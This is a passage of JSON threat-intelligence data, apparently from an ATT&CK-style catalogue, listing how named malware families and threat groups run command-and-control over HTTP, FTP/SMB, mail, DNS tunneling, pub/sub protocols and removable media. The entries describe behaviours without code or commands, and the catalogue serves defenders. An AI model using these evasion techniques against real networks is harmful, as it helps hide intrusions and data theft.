"description": "Ninja can use HTTP for C2 communications."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has used HTTP for C2 communications."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI has used HTTP for C2 communications."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has used HTTP GET and POST requests for C2 communications."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used HTTP for C2."}, {"id": "S0439", "name": "Okrum", "description": "Okrum uses HTTP for communication with its C2."}, {"id": "S0138", "name": "OLDBAIT", "description": "OLDBAIT can use HTTP for C2."}, {"id": "S0052", "name": "OnionDuke", "description": "OnionDuke uses HTTP and HTTPS for C2."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE uses HTTP for C2 communications."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors\u2019 XServer tool communicated using HTTP and HTTPS."}, {"id": "G0071", "name": "Orangeworm", "description": "Orangeworm has used HTTP for C2."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D can also use use HTTP POST and GET requests to send and receive C2 information."}, {"id": "S0594", "name": "Out1", "description": "Out1 can use HTTP and HTTPS in communications with remote hosts."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel has used HTTP for C2 communications."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can issue commands via HTTP POST."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can communicate over HTTP."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has used HTTP for C2 communication."}, {"id": "S0643", "name": "Peppy", "description": "Peppy can use HTTP to communicate with C2."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke transfers files from the compromised host via HTTP or HTTPS to a C2 server."}, {"id": "S1031", "name": "PingPull", "description": "A PingPull variant can communicate with its C2 servers by using HTTPS."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has used HTTP for communications with command and control (C2) servers."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can be configured to use HTTP for command and control."}, {"id": "S0067", "name": "pngdowner", "description": "pngdowner uses HTTP for command and control."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used HTTP and HTTPs for C2 communications."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke has has used HTTP GET requests in C2 communications."}, {"id": "S0453", "name": "Pony", "description": "Pony has sent collected information to the C2 via HTTP POST request."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use protocols like HTTP/HTTPS for command and control traffic."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON has used HTTP/HTTPS for C2 traffic."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can send HTTP GET requests to malicious servers."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER can use HTTP for C2 communications."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc uses HTTP over SSL to communicate commands with the control server."}, {"id": "S0078", "name": "Psylo", "description": "Psylo uses HTTPS for C2."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can use HTTP for C2."}, {"id": "S1108", "name": "PULSECHECK", "description": "PULSECHECK can check HTTP request headers for a specific backdoor key and if found will output the result of the command in the variable HTTP_X_CMD."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can communicate over HTTP for C2."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to use HTTP and HTTPS in communication with C2 servers."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses HTTPS and HTTP for C2 communications."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can use HTTPS for C2 communications."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can use HTTPS in C2 communications."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer uses HTTP, and particularly HTTP POST requests, for command and control actions."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use HTTP in C2 communications."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has used HTTP for C2."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has used HTTP for C2."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses outbound HTTP requests containing victim information for retrieving second stage payloads. Variants of Raspberry Robin can download archive files (such as 7-Zip files) via the victim web browser for second stage execution."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses HTTP/HTTPS for command and control communication."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can use HTTP in C2 communications."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API."}, {"id": "S0172", "name": "Reaver", "description": "Some Reaver variants use HTTP for C2."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used HTTP, HTTPS and Webdav protocls for C2 communications."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can communicate to its C2 over HTTP and HTTPS if directed."}, {"id": "S0019", "name": "Regin", "description": "The Regin malware platform supports many standard protocols, including HTTP and HTTPS."}, {"id": "S0375", "name": "Remexi", "description": "Remexi uses BITSAdmin to communicate with the C2 server over HTTP."}, {"id": "S0125", "name": "Remsec", "description": "Remsec is capable of using HTTP and HTTPS for C2."}, {"id": "S0496", "name": "REvil", "description": "REvil has used HTTP and HTTPS in communication with C2."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor uses HTTP for C2 communications."}, {"id": "S0003", "name": "RIPTIDE", "description": "APT12 has used RIPTIDE, a RAT that uses HTTP to communicate."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun has used HTTP and HTTPS for command and control."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use HTTP and HTTPS for command and control communication."}, {"id": "S0148", "name": "RTM", "description": "RTM has initiated connections to external domains using HTTPS."}, {"id": "S0085", "name": "S-Type", "description": "S-Type uses HTTP for C2."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used HTTP for C2 communications."}, {"id": "S0074", "name": "Sakula", "description": "Sakula uses HTTP for C2."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can use a .NET HTTPListener class to receive and handle HTTP POST requests."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke uses HTTP and HTTPS for C2."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt uses HTTP for C2 communications."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper uses HTTP for C2."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad communicates over HTTP to retrieve a string that is decoded into a C2 server URL."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon has used HTTP for C2."}, {"id": "S1019", "name": "Shark", "description": "Shark has the ability to use HTTP in C2 communications."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat communicated over HTTP and HTTPS with C2 servers."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter communicated over HTTP with preconfigured C2 servers."}, {"id": "S0589", "name": "Sibot", "description": "Sibot communicated with its C2 server via HTTP GET requests."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has used HTTP GET and POST requests over port 443 for C2."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used HTTP in C2 communications."}, {"id": "G0083", "name": "SilverTerrier", "description": "SilverTerrier uses HTTP for C2 communications."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE has the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests."}, {"id": "S0633", "name": "Sliver", "description": "Sliver has the ability to support C2 communications over HTTP/S."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has used HTTP and HTTPS for C2 communications."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can contact actor-controlled C2 servers by using the Telegram API over HTTPS."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader uses HTTP for C2."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has communicated with its C2 servers via HTTPS and HTTP POST requests."}, {"id": "S0159", "name": "SNUGRIDE", "description": "SNUGRIDE communicates with its C2 server over HTTP."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can use HTTP in C2 communications."}, {"id": "S0543", "name": "Spark", "description": "Spark has used HTTP POST requests to communicate with its C2 server to receive commands."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C server. "}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has used HTTP POST requests for C2 communications."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has the ability to contact actor-controlled C2 servers via HTTP."}, {"id": "S1112", "name": "STEADYPULSE", "description": "STEADYPULSE can parse web requests made to a targeted server to determine the next stage of execution."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware communicates with its C2 server via HTTPS."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can use HTTP and HTTPS in C2 communications."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses HTTP to communicate with a command and control server. "}, {"id": "S1042", "name": "SUGARDUMP", "description": "A SUGARDUMP variant has used HTTP for C2."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST communicated via HTTP GET or HTTP POST requests to third party servers for C2."}, {"id": "S0578", "name": "SUPERNOVA", "description": "SUPERNOVA had to receive an HTTP GET request containing a specific set of parameters in order to execute."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can communicate with its C2 servers via HTTP."}, {"id": "S0060", "name": "Sys10", "description": "Sys10 uses HTTP for C2."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used HTTP to communicate with C2 nodes."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used HTTP for C2 communications."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has used HTTP GET and POST requests for C2."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has the curl command to send credentials over HTTP and the curl and wget commands to download new software. TeamTNT has also used a custom user agent HTTP header in shell scripts."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uploads files via unencrypted HTTP. "}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 malware has used HTTP for C2."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can use HTTPS in C2 communications."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris can use HTTP to establish C2 communications."}, {"id": "S0678", "name": "Torisma", "description": "Torisma can use HTTP and HTTPS for C2 communications."}, {"id": "S0682", "name": "TrailBlazer", "description": "TrailBlazer has used HTTP requests for C2."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can communicate with C2 via HTTP POST requests."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used HTTP in communication with the C2."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers."}, {"id": "S0647", "name": "Turian", "description": "Turian has the ability to use HTTP for its C2."}, {"id": "G0010", "name": "Turla", "description": "Turla has used HTTP and HTTPS for C2 communications."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT has used HTTP for C2 communications."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used HTTPS for C2."}, {"id": "S0476", "name": "Valak", "description": "Valak has used HTTP in communications with C2."}, {"id": "S0636", "name": "VaporRage", "description": "VaporRage can use HTTP to download shellcode from compromised websites."}, {"id": "S0207", "name": "Vasport", "description": "Vasport creates a backdoor by making a connection using a HTTP POST."}, {"id": "S0442", "name": "VBShower", "description": "VBShower has attempted to obtain a VBS script from command and control (C2) nodes over HTTP."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN uses HTTP for C2 communications."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can use HTTP and HTTPS in C2 communications."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can make an HTTPS connection to download additional files."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used tools that communicate with C2 over HTTP."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to use HTTP for C2 communications."}, {"id": "S0059", "name": "WinMM", "description": "WinMM uses HTTP for C2."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used HTTP in outbound communications."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows has the ability to use encapsulated HTTP/S in C2 communications."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern uses HTTP and HTTPS protocols for exfiltration and command and control activity."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE can respond to specific HTTP POST requests to /api/v1/cav/client/visits."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has used HTTP for network communication."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used HTTP for network communications."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can communicate with its C2 server using HTTP requests."}, {"id": "S0341", "name": "Xbash", "description": "Xbash uses HTTP for C2 communications."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has communicated with the C2 server by sending POST requests over HTTP."}, {"id": "S0388", "name": "YAHOYAH", "description": "YAHOYAH uses HTTP for C2."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy uses HTTP for C2."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has used HTTP for C2."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda uses HTTP for C2 communications."}, {"id": "S0086", "name": "ZLib", "description": "ZLib communicates over HTTP for C2."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has used HTTP for C2 connections."}]}, {"name": "File Transfer Protocols", "description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.", "detailed_description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "id": "T1071.002", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 used exploit payloads that initiate download via ftp."}, {"id": "S0438", "name": "Attor", "description": "Attor has used FTP protocol for C2 communication."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can emulate an FTP server to connect to actor-controlled C2 servers."}, {"id": "S0465", "name": "CARROTBALL", "description": "CARROTBALL has the ability to use FTP in C2 communications."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports."}, {"id": "S1088", "name": "Disco", "description": "Disco can use SMB to transfer files."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used SMB for C2."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can communicate over FTP."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar uses FTP and FTPS to communicate with the C2 server."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used FTP to download additional malware to the target machine."}, {"id": "S0409", "name": "Machete", "description": "Machete uses FTP for Command & Control."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports SMB-based peer-to-peer C2 profiles."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI has used FTP for C2 communications."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors had the ability to use FTP for C2."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used FTP for C2 communications."}, {"id": "S0019", "name": "Regin", "description": "The Regin malware platform supports many standard protocols, including SMB."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has used FTP for C2 communications."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco has the ability to transfer data between SMB shares."}, {"id": "G0083", "name": "SilverTerrier", "description": "SilverTerrier uses FTP for C2 communications."}, {"id": "S0464", "name": "SYSCON", "description": "SYSCON has the ability to use FTP in C2 communications."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has used FTP for C2 connections."}]}, {"name": "Mail Protocols", "description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.", "detailed_description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "id": "T1071.003", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has used SMTP for C2 communications."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used email for C2 via an Office macro."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch uses SMTP for C2."}, {"id": "S0351", "name": "Cannon", "description": "Cannon uses SMTP/S and POP3/S for C2 communications by sending and receiving emails."}, {"id": "S0023", "name": "CHOPSTICK", "description": "Various implementations of CHOPSTICK communicate with C2 over SMTP and POP3."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT can use email attachments for command and control."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL can communicate over SMTP and POP3 for C2."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader uses the IMAP email protocol for command and control purposes."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can send email over SMTP."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used e-mail to send exfiltrated data to C2 servers."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron uses SMTP for C2."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can communicates with C2 using email messages via the Outlook Messaging API (MAPI)."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT uses the email platform, Naver, for C2 communications, leveraging SMTP."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use emails for C2 communications."}, {"id": "S0138", "name": "OLDBAIT", "description": "OLDBAIT can use SMTP for C2."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can use email attachments for C2 communications."}, {"id": "S0125", "name": "Remsec", "description": "Remsec is capable of using SMTP for C2."}, {"id": "G0083", "name": "SilverTerrier", "description": "SilverTerrier uses SMTP for C2 communications."}, {"id": "S1042", "name": "SUGARDUMP", "description": "A SUGARDUMP variant used SMTP for C2."}, {"id": "G0010", "name": "Turla", "description": "Turla has used multiple backdoors which communicate with a C2 server via email attachments."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use custom communications protocols that ride over SMTP."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy uses SMTP and POP3 for C2."}]}, {"name": "DNS", "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.", "detailed_description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "id": "T1071.004", "examples": [{"id": "S0504", "name": "Anchor", "description": "Variants of Anchor can use DNS tunneling to communicate with C2."}, {"id": "G0026", "name": "APT18", "description": "APT18 uses DNS for C2 communications."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used remote access tools that leverage DNS in communications with C2."}, {"id": "G0096", "name": "APT41", "description": "APT41 used DNS for C2 communications."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER can use DNS and TXT records within its DNS tunneling protocol for command and control."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use DNS over HTTPS for C2."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used Cobalt Strike to encapsulate C2 in DNS traffic."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used DNS tunneling for C2."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT uses DNS for C2."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used DNS to tunnel IPv4 C2 traffic."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use use IPv4 A records and IPv6 AAAA DNS records in C2 communications."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can cloak command and control traffic in DNS records from legitimate services to avoid reputation-based detection techniques. "}, {"id": "S0354", "name": "Denis", "description": "Denis has used DNS tunneling for C2 communications."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem  can direct queries to custom DNS servers and return C2 commands using TXT records."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has used DNS requests over UDP port 53 for C2."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used DNS tunnelling tools, such as dnscat/2 and Iodine, for C2 purposes."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has performed C2 using DNS via A, OPT, and TXT records."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to use DNS in communication with C2."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to communicate with its C2 over DNS."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can use DNS for C2 communications."}, {"id": "S0170", "name": "Helminth", "description": "Helminth can use DNS for C2."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can use DNS tunneling for C2 communications."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has used DNS for command and control."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang malware RoyalDNS has used DNS for C2."}, {"id": "S1020", "name": "Kevin", "description": "Variants of Kevin can communicate over DNS through queries to the server for constructed domain names with embedded information."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has leveraged dynamic DNS providers for C2 communications."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka uses DNS for C2."}, {"id": "S1015", "name": "Milan", "description": "Milan has the ability to use DNS for C2 communications."}, {"id": "S1047", "name": "Mori", "description": "Mori can use DNS tunneling to communicate with C2."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports DNS-based C2 profiles."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu uses DNS for the C2 communications."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use a DNS tunneling plugin to exfiltrate data by adding it to the subdomain portion of a DNS request."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used DNS for C2 including the publicly available requestbin.net tunneling service."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader uses DNS as its C2 protocol."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can be configured to use DNS for command and control."}, {"id": "S0145", "name": "POWERSOURCE", "description": "POWERSOURCE uses DNS TXT records for C2."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER can use DNS for C2 communications."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses DNS for C2 communications."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has used DNS to communicate with the C2."}, {"id": "S0125", "name": "Remsec", "description": "Remsec is capable of using DNS for C2."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has used DNS tunneling for C2 communications."}, {"id": "S1019", "name": "Shark", "description": "Shark can use DNS in C2 communications."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can support C2 communications over DNS."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can communicate over DNS with the C2 server."}, {"id": "S0157", "name": "SOUNDBITE", "description": "SOUNDBITE communicates via DNS for C2."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has used DNS TXT requests as for its C2 communication."}, {"id": "S0146", "name": "TEXTMATE", "description": "TEXTMATE uses DNS TXT records for C2."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has encoded outbound C2 communications in DNS requests consisting of character strings made to resemble standard domain names. The actual information transmitted by Uroburos is contained in the part of the character string prior to the first \u2018.\u2019 character."}, {"id": "S0514", "name": "WellMess", "description": "WellMess has the ability to use DNS tunneling for C2 communications."}]}, {"name": "Publish/Subscribe Protocols", "description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.", "detailed_description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nProtocols such as MQTT, XMPP, AMQP, and STOMP use a publish/subscribe design, with message distribution managed by a centralized broker. Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics. An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.", "id": "T1071.005", "examples": [{"id": "S0026", "name": "GLOOXMAIL", "description": "GLOOXMAIL communicates to servers operated by Google using the Jabber/XMPP protocol for C2."}]}]}, {"name": "Communication Through Removable Media", "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.", "detailed_description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.", "id": "T1092", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted."}, {"id": "S0023", "name": "CHOPSTICK", "description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim."}], "sub_techniques": []}, {"name": "Content Injection", "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.", "detailed_description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.\nAdversaries may inject content to victim systems in various 